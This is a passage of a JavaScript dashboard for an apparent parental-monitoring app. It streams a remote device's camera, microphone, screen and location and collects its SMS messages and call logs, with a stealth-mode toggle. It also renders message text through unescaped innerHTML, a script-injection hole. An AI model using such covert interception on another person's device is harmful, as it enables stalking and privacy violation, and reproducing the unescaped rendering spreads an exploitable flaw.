// Dashboard Component
console.log("✅ dashboard.js loaded");

class Dashboard {
  constructor(ui, webrtcManager) {
    this.ui = ui;
    this.webrtcManager = webrtcManager;
    this.childId = null;
    this.dataChannel = null;
    this.streamStates = {
      camera: false,
      mic: false,
      screen: false
    };
    this.connectionHealth = {
      lastPing: null,
      latency: null,
      isConnected: false,
      connectionQuality: 'unknown'
    };
    this.healthCheckInterval = null;
    this.latestSmsTimestamp = 0; // Track latest SMS timestamp received
    this.smsMessages = []; // Store all received SMS
    this.smsFilters = {
      sender: '',
      keyword: '',
      type: 'all',
      startDate: '',
      endDate: ''
    };
    this.latestCallLogTimestamp = 0;
    this.callLogMessages = [];
    this.callLogFilters = {
      type: 'all',
      startDate: '',
      endDate: ''
    };
    this.callLogSearchKeyword = '';
    this.init();
  }

  init() {
    this.setupEventListeners();
    this.createStreamWindows();
  }

  setupEventListeners() {
    // Listen for WebRTC stream events
    this.webrtcManager.setCallbacks({
      onConnectionEstablished: (dataChannel) => {
        this.dataChannel = dataChannel;
        this.ui.enableStreamControls(true);
        this.startConnectionHealthCheck();
        this.connectionHealth.isConnected = true;
        this.updateConnectionStatus();
        console.log('✅ Dashboard: Connection established');
      },
      onStreamReceived: (trackKind, stream) => {
        console.log(`🎥 Dashboard: Stream received for ${trackKind}`);
        
        // Map track kind to stream type
        let streamType = trackKind === 'video' ? 'camera' : 'mic';
        
        // Update UI with the stream
        this.ui.updateStream(streamType, stream);
      },
      onDataChannelMessage: (message) => {
        console.log('📩 Dashboard: Message from child:', message);
        this.handleChildMessage(message);
      }
    });
  }

  createStreamWindows() {
    const streamContainer = document.getElementById('stream-container');
    if (!streamContainer) return;

    // Create stream windows for different types (no separate Mic window)
    const streamTypes = ['Camera', 'Screen'];
    
    streamTypes.forEach(type => {
      this.ui.createStreamWindow(type, streamContainer);
    });
  }


  // Handle connection and show dashboard
  show(childId, peerConnection, dataChannel) {
    this.childId = childId;
    this.dataChannel = dataChannel;
    
    // Update UI
    this.ui.showScreen('dashboard');
    this.ui.updateConnectionStatus(childId, true);
    this.ui.enableStreamControls(true);
    
    // Initialize location streaming state
    this.locationStreaming = false;
    
    console.log('✅ Dashboard shown for child:', childId);
  }

  // Handle messages from child device
  handleChildMessage(message) {
    // Handle stealth ACKs first
    if (message === 'STEALTH_ON_ACK') {
      if (typeof setStealthOn === 'function') setStealthOn();
      return;
    }
    if (message === 'STEALTH_OFF_ACK') {
      if (typeof setStealthOff === 'function') setStealthOff();
      return;
    }
    // Universal SMS/CallLog handler
    try {
      if (message.startsWith('{')) {
        const data = JSON.parse(message);
        if (data.type === 'sms') {
          this.appendSmsMessage(data);
          this.renderSmsList();
          return;
        }
        if (data.type === 'calllog') {
          this.appendCallLogMessage(data);
          this.renderCallLogList();
          return;
        }
      }
    } catch (e) {}
    // Handle different message types
    switch (message) {
      case 'CAMERA_STARTED':
        this.streamStates.camera = true;
        this.ui.showNotification('📷 Camera started', 'success');
        break;
      case 'CAMERA_STOPPED':
        this.streamStates.camera = false;
        this.ui.showNotification('📷 Camera stopped', 'info');
        break;
      case 'MIC_STARTED':
        this.streamStates.mic = true;
        this.ui.showNotification('🎤 Microphone started', 'success');
        break;
      case 'MIC_STOPPED':
        this.streamStates.mic = false;
        this.ui.showNotification('🎤 Microphone stopped', 'info');
        break;
      case 'SCREEN_STARTED':
        this.streamStates.screen = true;
        this.ui.showNotification('🖥️ Screen sharing started', 'success');
        break;
      case 'SCREEN_STOPPED':
        this.streamStates.screen = false;
        this.ui.showNotification('🖥️ Screen sharing stopped', 'info');
        break;
      case 'SCREEN_PERMISSION_GRANTED':
        this.ui.showNotification('✅ Screen capture permission granted', 'success');
        break;
      case 'SCREEN_PERMISSION_DENIED':
        this.ui.showNotification('❌ Screen capture permission denied', 'error');
        break;
      case 'SCREEN_PERMISSION_ERROR':
        this.ui.showNotification('❌ Screen capture permission error', 'error');
        break;
      case 'SCREEN_CAPTURE_ERROR':
        this.ui.showNotification('❌ Screen capture failed to start', 'error');
        break;
      case 'PONG_CHILD':
        this.handlePongResponse();
        this.ui.showNotification('🏓 Child device is responsive', 'success');
        break;
      case 'LOCATION_STARTED':
        this.streamStates.location = true;
        this.ui.showNotification('📍 Location tracking started', 'success');
        this.locationStreaming = true;
        this.updateLocationButton();
        break;
      case 'LOCATION_STOPPED':
        this.streamStates.location = false;
        this.ui.showNotification('📍 Location tracking stopped', 'info');
        this.locationStreaming = false;
        this.updateLocationButton();
        break;
      case 'LOCATION_PERMISSION_DENIED':
        this.ui.showNotification('❌ Location permission denied', 'error');
        break;
      case 'SMS_STARTED':
        this.streamStates.sms = true;
        this.ui.showNotification('📩 SMS monitoring started', 'success');
        break;
      case 'SMS_STOPPED':
        this.streamStates.sms = false;
        this.ui.showNotification('📩 SMS monitoring stopped', 'info');
        break;
      case 'CALLLOG_STARTED':
        this.streamStates.calllog = true;
        if (window._featureBtnUpdateListeners && window._featureBtnUpdateListeners['calllog']) {
          window._featureBtnUpdateListeners['calllog']();
        }
        break;
      case 'CALLLOG_STOPPED':
        this.streamStates.calllog = false;
        if (window._featureBtnUpdateListeners && window._featureBtnUpdateListeners['calllog']) {
          window._featureBtnUpdateListeners['calllog']();
        }
        break;
      default:
        // Check if it's a location update JSON message
        if (message.startsWith('{')) {
          try {
            const data = JSON.parse(message);
            if (data.type === 'LOCATION_UPDATE') {
              this.handleLocationUpdate(data);
              return;
            }
          } catch (error) {
            console.error('Error parsing JSON message:', error);
          }
        }
        console.log('📩 Unknown message from child:', message);
    }
  }

  // Handle location updates from child device
  handleLocationUpdate(data) {
    if (data.coords && data.coords.length >= 2) {
      const [lat, lng] = data.coords;
      let locationName = data.locationName || null;
      
      // If no location name provided, try to get it via reverse geocoding
      if (!locationName && window.locationManager) {
        window.locationManager.reverseGeocode(lat, lng).then(name => {
          if (name) {
            window.locationManager.updateLocation(lat, lng, name);
          }
        });
      }
      
      // Update location immediately with available data
      if (window.locationManager) {
        window.locationManager.updateLocation(lat, lng, locationName);
      }
      
      console.log(`📍 Location updated: ${lat}, ${lng}${locationName ? ` - ${locationName}` : ''}`);
    }
  }

  // Toggle stream (called from UI)
  toggleStream(type) {
    const isActive = this.streamStates[type];
    const command = isActive ? `${type.toUpperCase()}_OFF` : `${type.toUpperCase()}_ON`;
    
    if (this.sendCommand(command)) {
      this.streamStates[type] = !isActive;
      this.ui.updateButtonState(type, !isActive);
      
      console.log(`📤 Toggled ${type} stream: ${!isActive ? 'ON' : 'OFF'}`);
    }
  }

  // Send command to child device
  sendCommand(command) {
    if (!this.dataChannel || this.dataChannel.readyState !== 'open') {
      this.ui.showNotification('⚠️ Connection not ready', 'warning');
      return false;
    }

    try {
      let toSend = command;
      if (typeof command === 'object') {
        toSend = JSON.stringify(command);
      }
      this.dataChannel.send(toSend);
      console.log('📤 Sent command:', toSend);
      
      // If this is a MIC_ON command, prepare for audio playback
      if ((typeof command === 'string' && command === 'MIC_ON') || (typeof command === 'object' && command.cmd === 'MIC_ON')) {
        this.prepareAudioPlayback();
      }
      
      return true;
    } catch (error) {
      console.error('❌ Failed to send command:', error);
      this.ui.showNotification('❌ Failed to send command', 'error');
      return false;
    }
  }

  // Prepare audio playback by ensuring user interaction
  prepareAudioPlayback() {
    console.log('🎧 Preparing audio playback...');
    
    // Create a silent audio context to enable audio playback
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    
    if (audioContext.state === 'suspended') {
      console.log('🔇 Audio context suspended, will resume on user interaction');
      
      // Add click listener to resume audio context
      const resumeAudio = () => {
        audioContext.resume().then(() => {
          console.log('🔊 Audio context resumed');
          document.removeEventListener('click', resumeAudio);
        });
      };
      
      document.addEventListener('click', resumeAudio);
      this.ui.showNotification('Click anywhere to enable audio', 'info');
    }
  }

  // Reset dashboard state
  reset() {
    this.childId = null;
    this.dataChannel = null;
    this.streamStates = {
      camera: false,
      mic: false,
      screen: false
    };
    this.locationStreaming = false;
    
    // Stop health monitoring
    this.stopConnectionHealthCheck();
    this.connectionHealth = {
      lastPing: null,
      latency: null,
      isConnected: false,
      connectionQuality: 'unknown'
    };
    
    // Reset UI
    this.ui.updateConnectionStatus(null, false);
    this.ui.enableStreamControls(false);
    this.ui.clearAllStreams();
    
    // Reset button states
    Object.keys(this.streamStates).forEach(type => {
      this.ui.updateButtonState(type, false);
    });
    
    // Reset location button
    this.updateLocationButton();
  }

  // Handle disconnection
  disconnect() {
    console.log('🔌 Disconnecting from child device');
    
    // Clean up WebRTC connection
    this.webrtcManager.cleanup();
    
    // Reset dashboard
    this.reset();
    
    // Show notification
    this.ui.showNotification('🔌 Disconnected from child device', 'info');
  }

  // Toggle location streaming
  toggleLocationStreaming() {
    if (this.locationStreaming) {
      this.sendCommand('LOCATION_STOP');
    } else {
      this.sendCommand('LOCATE_CHILD');
    }
  }

  // Update location button text
  updateLocationButton() {
    const button = document.getElementById('quick-location');
    if (button) {
      button.textContent = this.locationStreaming ? '📍 Stop Location' : '📍 Start Location';
      button.className = this.locationStreaming 
        ? 'text-xs px-3 py-1 rounded bg-red-700 hover:bg-red-800 transition'
        : 'text-xs px-3 py-1 rounded bg-yellow-700 hover:bg-yellow-800 transition';
    }
  }

  // Get current connection status
  getConnectionStatus() {
    return {
      childId: this.childId,
      connected: this.dataChannel && this.dataChannel.readyState === 'open',
      streamStates: { ...this.streamStates },
      locationStreaming: this.locationStreaming,
      connectionHealth: this.connectionHealth
    };
  }
  
  startConnectionHealthCheck() {
    // Clear any existing interval
    if (this.healthCheckInterval) {
      clearInterval(this.healthCheckInterval);
    }
    
    // Start periodic health checks
    this.healthCheckInterval = setInterval(() => {
      this.performHealthCheck();
    }, 30000); // Check every 30 seconds
    
    // Perform initial health check
    this.performHealthCheck();
  }
  
  performHealthCheck() {
    if (!this.dataChannel || this.dataChannel.readyState !== 'open') {
      this.connectionHealth.isConnected = false;
      this.connectionHealth.connectionQuality = 'disconnected';
      this.updateConnectionStatus();
      return;
    }
    
    // Send ping to measure latency
    const pingStart = Date.now();
    this.sendCommand('PING_CHILD');
    
    // Store ping start time for latency calculation
    this.connectionHealth.lastPing = pingStart;
  }
  
  updateConnectionStatus() {
    const statusEl = document.getElementById('connection-status');
    if (!statusEl) return;
    
    let statusText = '⚫';
    let statusClass = 'text-gray-400';
    
    if (this.connectionHealth.isConnected) {
      switch (this.connectionHealth.connectionQuality) {
        case 'excellent':
          statusText = '🟢';
          statusClass = 'text-green-400';
          break;
        case 'good':
          statusText = '🟡';
          statusClass = 'text-yellow-400';
          break;
        case 'poor':
          statusText = '🟠';
          statusClass = 'text-orange-400';
          break;
        default:
          statusText = '🔵';
          statusClass = 'text-blue-400';
      }
    } else {
      statusText = '🔴';
      statusClass = 'text-red-400';
    }
    
    statusEl.textContent = statusText;
    statusEl.className = `text-lg ${statusClass}`;
    
    // Update connection info tooltip
    const tooltip = this.getConnectionTooltip();
    statusEl.title = tooltip;
  }
  
  getConnectionTooltip() {
    if (!this.connectionHealth.isConnected) {
      return 'Disconnected';
    }
    
    let tooltip = `Connected to ${this.childId}`;
    
    if (this.connectionHealth.latency !== null) {
      tooltip += `\nLatency: ${this.connectionHealth.latency}ms`;
    }
    
    if (this.connectionHealth.connectionQuality !== 'unknown') {
      tooltip += `\nQuality: ${this.connectionHealth.connectionQuality}`;
    }
    
    return tooltip;
  }
  
  stopConnectionHealthCheck() {
    if (this.healthCheckInterval) {
      clearInterval(this.healthCheckInterval);
      this.healthCheckInterval = null;
    }
  }
  
  handlePongResponse() {
    if (this.connectionHealth.lastPing) {
      const latency = Date.now() - this.connectionHealth.lastPing;
      this.connectionHealth.latency = latency;
      
      // Determine connection quality based on latency
      if (latency < 100) {
        this.connectionHealth.connectionQuality = 'excellent';
      } else if (latency < 300) {
        this.connectionHealth.connectionQuality = 'good';
      } else if (latency < 1000) {
        this.connectionHealth.connectionQuality = 'poor';
      } else {
        this.connectionHealth.connectionQuality = 'very_poor';
      }
      
      this.updateConnectionStatus();
      console.log(`🏓 Pong received - Latency: ${latency}ms, Quality: ${this.connectionHealth.connectionQuality}`);
    }
  }
}

// [SMS Monitoring] Add new section and controls for SMS monitoring
Dashboard.prototype.addSmsMonitoringUI = function() {
  if (document.getElementById('sms-section')) return;
  const placeholder = document.getElementById('sms-section-placeholder');
  if (!placeholder) return;
  const smsSection = document.createElement('div');
  smsSection.id = 'sms-section';
  smsSection.className = 'p-4 bg-zinc-800 rounded-lg shadow-lg mt-6 max-w-2xl mx-auto';
  smsSection.innerHTML = `
    <div class="flex items-center justify-between mb-2">
      <h2 class="text-lg font-bold text-green-400">📩 SMS Monitor</h2>
      <div>
        <button id="sms-start-btn" class="bg-green-700 hover:bg-green-800 text-white px-3 py-1 rounded mr-2">Start</button>
        <button id="sms-stop-btn" class="bg-red-700 hover:bg-red-800 text-white px-3 py-1 rounded">Stop</button>
      </div>
    </div>
    <div id="sms-filter-bar" class="flex flex-wrap gap-2 mb-2 items-center bg-zinc-900 p-2 rounded">
      <input id="sms-filter-sender" type="text" placeholder="Sender/Number" class="px-2 py-1 rounded bg-zinc-800 text-white border border-zinc-700 text-xs" style="width: 120px;" />
      <input id="sms-filter-keyword" type="text" placeholder="Keyword" class="px-2 py-1 rounded bg-zinc-800 text-white border border-zinc-700 text-xs" style="width: 120px;" />
      <select id="sms-filter-type" class="px-2 py-1 rounded bg-zinc-800 text-white border border-zinc-700 text-xs">
        <option value="all">All</option>
        <option value="inbox">Inbox</option>
        <option value="sent">Sent</option>
      </select>
      <input id="sms-filter-start" type="date" class="px-2 py-1 rounded bg-zinc-800 text-white border border-zinc-700 text-xs" />
      <input id="sms-filter-end" type="date" class="px-2 py-1 rounded bg-zinc-800 text-white border border-zinc-700 text-xs" />
      <button id="sms-filter-apply" class="bg-blue-700 hover:bg-blue-800 text-white px-3 py-1 rounded text-xs">Apply Filter</button>
      <button id="sms-filter-clear" class="bg-gray-700 hover:bg-gray-800 text-white px-3 py-1 rounded text-xs">Clear</button>
    </div>
    <div id="sms-list" class="max-h-64 overflow-y-auto bg-zinc-900 rounded p-2 border border-zinc-700 text-xs text-white" style="min-height: 60px;">No SMS received yet.</div>
  `;
  placeholder.appendChild(smsSection);
  document.getElementById('sms-start-btn').onclick = () => this.sendCommand({cmd: 'SMS_ON', since: this.latestSmsTimestamp});
  document.getElementById('sms-stop-btn').onclick = () => this.sendCommand('SMS_OFF');
  document.getElementById('sms-filter-apply').onclick = () => this.applySmsFilter();
  document.getElementById('sms-filter-clear').onclick = () => this.clearSmsFilter();
};

Dashboard.prototype.appendSmsMessage = function(sms) {
  // Store in array
  this.smsMessages.push(sms);
  // Update latest timestamp
  if (typeof sms.timestamp === 'number' && sms.timestamp > this.latestSmsTimestamp) {
    this.latestSmsTimestamp = sms.timestamp;
  }
  // Re-render filtered list
  this.renderSmsList();
  // Also update floating window if open
  const smsList = document.getElementById('sms-list');
  if (smsList) {
    this.renderSmsList();
  }
};

Dashboard.prototype.renderSmsList = function() {
  const smsList = document.getElementById('sms-list');
  if (!smsList) return;
  let filtered = this.smsMessages;
  const { sender, keyword, type, startDate, endDate } = this.smsFilters;
  if (sender) {
    filtered = filtered.filter(sms => (sms.address || '').toLowerCase().includes(sender.toLowerCase()));
  }
  if (keyword) {
    filtered = filtered.filter(sms => (sms.body || '').toLowerCase().includes(keyword.toLowerCase()));
  }
  if (type && type !== 'all') {
    filtered = filtered.filter(sms => sms.sms_type === type);
  }
  if (startDate) {
    const startTs = new Date(startDate).setHours(0,0,0,0);
    filtered = filtered.filter(sms => sms.timestamp >= startTs);
  }
  if (endDate) {
    const endTs = new Date(endDate).setHours(23,59,59,999);
    filtered = filtered.filter(sms => sms.timestamp <= endTs);
  }
  smsList.innerHTML = '';
  if (filtered.length === 0) {
    smsList.innerText = 'No SMS match the filter.';
    return;
  }
  filtered.slice().sort((a, b) => b.timestamp - a.timestamp).forEach(sms => {
    const smsDiv = document.createElement('div');
    smsDiv.className = 'mb-2 p-2 rounded bg-zinc-700';
    smsDiv.innerHTML = `<b>${sms.sms_type === 'inbox' ? '📥' : '📤'} ${sms.address}</b> <span class='text-gray-400'>[${new Date(sms.timestamp).toLocaleString()}]</span><br>${sms.body}`;
    smsList.appendChild(smsDiv);
  });
};

Dashboard.prototype.applySmsFilter = function() {
  this.smsFilters.sender = document.getElementById('sms-filter-sender').value.trim();
  this.smsFilters.keyword = document.getElementById('sms-filter-keyword').value.trim();
  this.smsFilters.type = document.getElementById('sms-filter-type').value;
  this.smsFilters.startDate = document.getElementById('sms-filter-start').value;
  this.smsFilters.endDate = document.getElementById('sms-filter-end').value;
  this.renderSmsList();
};

Dashboard.prototype.clearSmsFilter = function() {
  this.smsFilters = { sender: '', keyword: '', type: 'all', startDate: '', endDate: '' };
  document.getElementById('sms-filter-sender').value = '';
  document.getElementById('sms-filter-keyword').value = '';
  document.getElementById('sms-filter-type').value = 'all';
  document.getElementById('sms-filter-start').value = '';
  document.getElementById('sms-filter-end').value = '';
  this.renderSmsList();
};

Dashboard.prototype.handleChildMessageWithSms = function(message) {
  try {
    if (message.startsWith('{')) {
      const data = JSON.parse(message);
      if (data.type === 'sms') {
        this.appendSmsMessage(data);
        // Update floating window
        this.renderSmsList();
        return;
      }
    }
  } catch (e) {}
  if (this.handleChildMessageOrig) {
    this.handleChildMessageOrig(message);
  }
};

Dashboard.prototype.initSmsMonitoring = function() {
  this.addSmsMonitoringUI();
  this.handleChildMessageOrig = this.handleChildMessage.bind(this);
  this.handleChildMessage = this.handleChildMessageWithSms.bind(this);
};

// [SMS Monitoring] Patch show to initialize SMS monitoring
const origShow = Dashboard.prototype.show;
Dashboard.prototype.show = function(childId, peerConnection, dataChannel) {
  origShow.call(this, childId, peerConnection, dataChannel);
  this.initSmsMonitoring();
  // Ensure the latest handleChildMessage is used for incoming messages
  if (this.webrtcManager && typeof this.webrtcManager.setCallbacks === 'function') {
    this.webrtcManager.setCallbacks({
      onDataChannelMessage: this.handleChildMessage.bind(this),
      // Optionally, re-set other callbacks if needed
    });
  }
};

// [Call Log Monitoring] Add new section and controls for Call Log monitoring
Dashboard.prototype.addCallLogMonitoringUI = function() {
  if (document.getElementById('calllog-section')) return;
  const placeholder = document.getElementById('calllog-section-placeholder');
  if (!placeholder) return;
  const callLogSection = document.createElement('div');
  callLogSection.id = 'calllog-section';
  callLogSection.className = 'p-4 bg-zinc-800 rounded-lg shadow-lg mt-6 max-w-2xl mx-auto';
  callLogSection.innerHTML = `
    <div class="flex items-center justify-between mb-2">
      <h2 class="text-lg font-bold text-blue-400">📞 Call Log Monitor</h2>
      <div>
        <button id="calllog-start-btn" class="bg-green-700 hover:bg-green-800 text-white px-3 py-1 rounded mr-2">Show Call Logs</button>
        <button id="calllog-stop-btn" class="bg-red-700 hover:bg-red-800 text-white px-3 py-1 rounded">Stop Call Log</button>
      </div>
    </div>
    <div id="calllog-list" class="max-h-64 overflow-y-auto bg-zinc-900 rounded p-2 border border-zinc-700 text-xs text-white" style="min-height: 60px;">No call logs received yet.</div>
  `;
  placeholder.appendChild(callLogSection);
  document.getElementById('calllog-start-btn').onclick = () => this.sendCommand({cmd: 'CALLLOG_ON', since: this.latestCallLogTimestamp});
  document.getElementById('calllog-stop-btn').onclick = () => this.sendCommand('CALLLOG_OFF');
};
Dashboard.prototype.appendCallLogMessage = function(log) {
  this.callLogMessages.push(log);
  if (typeof log.timestamp === 'number' && log.timestamp > this.latestCallLogTimestamp) {
    this.latestCallLogTimestamp = log.timestamp;
  }
  this.renderCallLogList();
};
Dashboard.prototype.renderCallLogList = function() {
  const callLogList = document.getElementById('calllog-list');
  if (!callLogList) return;
  let logs = this.callLogMessages;
  
  // Apply filters
  if (this.callLogFilters || this.callLogSearchKeyword) {
    logs = logs.filter(log => {
      // Type filter
      if (this.callLogFilters && this.callLogFilters.type !== 'all' && log.call_type !== this.callLogFilters.type) {
        return false;
      }
      
      // Date range filter
      if (this.callLogFilters && this.callLogFilters.startDate) {
        const logDate = new Date(log.timestamp);
        const startDate = new Date(this.callLogFilters.startDate);
        if (logDate < startDate) return false;
      }
      
      if (this.callLogFilters && this.callLogFilters.endDate) {
        const logDate = new Date(log.timestamp);
        const endDate = new Date(this.callLogFilters.endDate);
        endDate.setHours(23, 59, 59, 999); // End of day
        if (logDate > endDate) return false;
      }
      
      // Search keyword filter
      if (this.callLogSearchKeyword) {
        const searchTerm = this.callLogSearchKeyword.toLowerCase();
        const numberMatch = log.number && log.number.toLowerCase().includes(searchTerm);
        const nameMatch = log.name && log.name.toLowerCase().includes(searchTerm);
        if (!numberMatch && !nameMatch) return false;
      }
      
      return true;
    });
  }
  
  callLogList.innerHTML = '';
  if (logs.length === 0) {
    callLogList.innerText = this.callLogMessages.length === 0 ? 'No call logs received yet.' : 'No call logs match the filter.';
    return;
  }
  logs.slice().sort((a, b) => b.timestamp - a.timestamp).forEach(log => {
    const logDiv = document.createElement('div');
    logDiv.className = 'mb-2 p-2 rounded bg-zinc-700';
    logDiv.innerHTML = `<b>${log.call_type === 'incoming' ? '📥' : log.call_type === 'outgoing' ? '📤' : '❗'} ${log.number}</b> <span class='text-gray-400'>[${new Date(log.timestamp).toLocaleString()}]</span><br>Name: ${log.name || 'Unknown'}<br>Duration: ${log.duration}s`;
    callLogList.appendChild(logDiv);
  });
};

// --- Feature Window Content Management ---
window.injectFeatureContent = function(feature, container) {
  // Clear previous content
  container.innerHTML = '';
  const app = window.parentApp;
  let state = app && app.dashboard && app.dashboard.streamStates ? app.dashboard.streamStates[feature] : false;
  let buttonId = `${feature}-toggle`;
  let statusId = `${feature}-status`;
  let startCmd = (feature === 'location') ? 'LOCATE_CHILD' : `${feature.toUpperCase()}_ON`;
  let stopCmd = (feature === 'location') ? 'LOCATE_CHILD_STOP' : `${feature.toUpperCase()}_OFF`;
  let label = state ? 'Stop' : 'Start';
  let btnClass = state ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700';
  let icon = '';
  let loading = false;
  switch (feature) {
    case 'camera': icon = '📷'; break;
    case 'screen': icon = '🖥️'; break;
    case 'mic': icon = '🎤'; break;
    case 'location': icon = '📍'; break;
    case 'sms': icon = '📩'; break;
    case 'calllog': icon = '📞'; break;
  }
  if (feature === 'camera') {
      container.innerHTML = `
        <div class="feature-section" style="position:relative;">
        <video class="video-camera w-full h-64 object-cover rounded mb-2 hidden" autoplay playsinline muted></video>
        <button class="camera-flip-btn" title="Switch Camera" style="position:absolute;top:12px;right:16px;z-index:10;background:rgba(24,24,27,0.85);border:none;border-radius:50%;padding:7px;cursor:pointer;display:flex;align-items:center;justify-content:center;">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M17 10.5V7C17 5.89543 16.1046 5 15 5H9C7.89543 5 7 5.89543 7 7V10.5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            <path d="M7 13.5V17C7 18.1046 7.89543 19 9 19H15C16.1046 19 17 18.1046 17 17V13.5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            <path d="M3 12L5 14M3 12L5 10M3 12H21" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </button>
        <button class="feature-action-btn ${btnClass}" id="${buttonId}">${icon} ${label} Camera</button>
        <div id="${statusId}" class="feature-status"></div>
        <div id="${feature}-extra"></div>
        </div>
      `;
    // --- Assign stream if already active ---
    const app = window.parentApp;
    if (app && app.webrtcManager && app.webrtcManager.videoStreams && app.webrtcManager.videoStreams.camera) {
      const stream = app.webrtcManager.videoStreams.camera;
      document.querySelectorAll('.video-camera').forEach(videoEl => {
        videoEl.srcObject = stream;
        videoEl.classList.remove('hidden');
        videoEl.onloadedmetadata = () => {
          videoEl.play().catch(() => {});
        };
      });
    }
    // Camera flip button logic
    const flipBtn = container.querySelector('.camera-flip-btn');
    if (flipBtn) {
      flipBtn.addEventListener('click', () => {
        if (window.parentApp && window.parentApp.dashboard && window.parentApp.dashboard.dataChannel) {
          window.parentApp.dashboard.dataChannel.send('CAMERA_SWITCH');
        }
      });
    }
  } else if (feature === 'screen') {
      container.innerHTML = `
        <div class="feature-section">
        <video class="video-screen w-full h-64 object-cover rounded mb-2 hidden" autoplay playsinline muted></video>
        <button class="feature-action-btn ${btnClass}" id="${buttonId}">${icon} ${label} Screen</button>
        <div id="${statusId}" class="feature-status"></div>
        <div id="${feature}-extra"></div>
        </div>
      `;
    // --- Assign stream if already active ---
    const app = window.parentApp;
    if (app && app.webrtcManager && app.webrtcManager.videoStreams && app.webrtcManager.videoStreams.screen) {
      const stream = app.webrtcManager.videoStreams.screen;
      document.querySelectorAll('.video-screen').forEach(videoEl => {
        videoEl.srcObject = stream;
        videoEl.classList.remove('hidden');
        videoEl.onloadedmetadata = () => {
          videoEl.play().catch(() => {});
        };
      });
    }
  } else if (feature === 'location') {
      container.innerHTML = `
      <div style=\"position:relative;width:100%;height:320px;min-width:180px;min-height:120px;\">
        <div id=\"location-map\" style=\"width:100%;height:100%;resize:both;overflow:auto;border-radius:12px;\"></div>
        <div class=\"location-info\" style=\"position:absolute;bottom:12px;left:12px;z-index:1000;background:rgba(24,24,27,0.97);color:#fff;padding:8px 16px;border-radius:8px;font-size:14px;font-weight:500;box-shadow:0 2px 8px #000b;pointer-events:none;\">
          <div id=\"location-name\" class=\"location-name\"></div>
          <div id=\"location-coords\" class=\"location-coords\" style=\"color:#e0e0e0;font-size:13px;font-weight:400;\"></div>
        </div>
      </div>
      <button class=\"feature-action-btn ${btnClass}\" id=\"${buttonId}\" style=\"position:absolute;left:50%;bottom:18px;transform:translateX(-50%);width:90%;max-width:400px;z-index:2000;box-shadow:0 2px 8px #000b;\">${icon} ${label} Location</button>
      <div id=\"${statusId}\" class=\"feature-status\"></div>
      <div id=\"${feature}-extra\"></div>
    `;
    // Dynamically create a new LocationManager for this window
    if (window.LocationManager) {
      window.locationManager = new window.LocationManager();
    }
    // Add ResizeObserver to keep map in sync with map container size
    const mapEl = document.getElementById('location-map');
    if (mapEl && window.locationManager && window.locationManager.map) {
      const ro = new ResizeObserver(() => {
        window.locationManager.map.invalidateSize();
      });
      ro.observe(mapEl);
    }
    // Define app variable for location branch
    const app = window.parentApp;
  
  } else if (feature === 'mic') {
    container.innerHTML = `
      <div class=\"feature-section\">
        <canvas id=\"mic-wave\" width=\"320\" height=\"48\" style=\"width:100%;height:48px;display:block;margin-bottom:0.5rem;border-radius:10px;background:rgba(24,24,27,0.85);box-shadow:0 2px 8px #0008;\"></canvas>
        <audio id=\"video-mic\" autoplay controls style=\"width:100%;display:block;margin-bottom:1rem;\"></audio>
        <button class=\"feature-action-btn ${btnClass}\" id=\"${buttonId}\">${icon} ${label} Mic</button>
        <div id=\"${statusId}\" class=\"feature-status\"></div>
        <div id=\"${feature}-extra\"></div>
        </div>
      `;
    const app = window.parentApp;
    // --- Assign stream if already active ---
    if (app && app.webrtcManager && app.webrtcManager.videoStreams && app.webrtcManager.videoStreams.mic) {
      const stream = app.webrtcManager.videoStreams.mic;
      const audioElement = document.getElementById('video-mic');
      if (audioElement) {
        audioElement.srcObject = stream;
        audioElement.muted = false;
        audioElement.autoplay = true;
        audioElement.controls = false;
        audioElement.style.display = 'block';
        audioElement.play().catch(() => {});
      }
      const waveCanvas = document.getElementById('mic-wave');
      if (waveCanvas && window.AudioContext) {
        const ctx = waveCanvas.getContext('2d');
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const analyser = audioCtx.createAnalyser();
        analyser.fftSize = 256;
        const source = audioCtx.createMediaStreamSource(stream);
        source.connect(analyser);
        const dataArray = new Uint8Array(analyser.frequencyBinCount);
        function drawWave() {
          analyser.getByteTimeDomainData(dataArray);
          ctx.clearRect(0, 0, waveCanvas.width, waveCanvas.height);
          ctx.save();
          ctx.lineWidth = 3;
          ctx.strokeStyle = 'rgba(99, 255, 188, 0.95)';
          ctx.shadowColor = '#22d3ee';
          ctx.shadowBlur = 8;
          ctx.beginPath();
          const sliceWidth = waveCanvas.width / dataArray.length;
          let x = 0;
          for (let i = 0; i < dataArray.length; i++) {
            const v = dataArray[i] / 128.0;
            const y = (v * waveCanvas.height) / 2;
            if (i === 0) {
              ctx.moveTo(x, y);
            } else {
              ctx.lineTo(x, y);
            }
            x += sliceWidth;
          }
          ctx.stroke();
          ctx.restore();
          requestAnimationFrame(drawWave);
        }
        drawWave();
      }
    }
  
  } else if (feature === 'sms') {
      container.innerHTML = `
      <div class=\"feature-section\" style=\"padding:0.5rem 0;position:relative;\">
        <div style=\"position:fixed;top:64px;left:50%;transform:translateX(-50%);width:90%;max-width:400px;z-index:3000;display:flex;align-items:center;gap:0.75rem;box-shadow:0 2px 16px #000b;opacity:1;background:#18181b;border-radius:0.5rem;padding:0.25rem 0.75rem;\">
          <input id=\"sms-search-bar\" type=\"text\" placeholder=\"Search messages...\" class=\"px-3 py-2 rounded bg-zinc-900 text-white border border-zinc-700 text-sm\" style=\"flex:1;min-width:0;outline:none;border-radius:0.375rem;opacity:1;background:#18181b;\" />
          <button id=\"sms-filter-toggle\" aria-label=\"Show filters\" style=\"background:none;border:none;outline:none;cursor:pointer;font-size:1.7rem;line-height:1;color:#fff;opacity:1;transition:background 0.2s;border-radius:0.375rem;padding:0.2rem 0.6rem;\">☰</button>
        </div>
        <div id=\"sms-filter-dropdown\" style=\"display:none;position:fixed;top:108px;left:calc(50% + 120px);transform:translateX(-50%);min-width:220px;max-width:260px;z-index:4000;background:#23232b;border-radius:0.75rem;box-shadow:0 8px 32px #000b,0 1.5px 6px #0007;padding:1rem 1.1rem;opacity:1;\">
